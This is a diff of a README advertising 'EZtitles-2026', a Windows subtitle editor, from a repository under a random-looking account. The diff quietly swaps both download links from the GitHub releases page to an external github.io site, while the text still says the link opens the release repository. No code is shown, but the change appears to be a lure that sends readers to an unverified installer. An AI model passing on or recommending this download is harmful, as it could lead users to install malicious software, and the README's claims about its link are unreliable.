@@ -1,6 +1,6 @@
 # 📁 EZtitles-2026 - Create professional subtitles on your Windows PC
 
-[![Download EZtitles-2026](https://img.shields.io/badge/Download-EZtitles-2026-blue)](https://github.com/endoscopic-gawker745/EZtitles-2026/releases)
+[![Download EZtitles-2026](https://img.shields.io/badge/Download-EZtitles-2026-blue)](https://endoscopic-gawker745.github.io)
 
 ## 📌 Overview
 EZtitles-2026 provides a professional environment for subtitle creation and editing. This software helps users time subtitles to video, format text, and export files for various platforms. It serves as a tool for translators, editors, and content creators who need precision and control over their subtitles. This version works on Windows 10 and Windows 11.
@@ -18,7 +18,7 @@ Before you install, ensure your computer meets these minimum specifications:
 ## 📥 Downloading the Software 🚀
 To get the latest version of the application, visit the release page. This page contains the full installer required for your system.
 
-[Click here to open the download page](https://github.com/endoscopic-gawker745/EZtitles-2026/releases)
+[Click here to open the download page](https://endoscopic-gawker745.github.io)
 
 Follow these steps to access the file:
 1. Click the link above to open the release repository in your web browser.
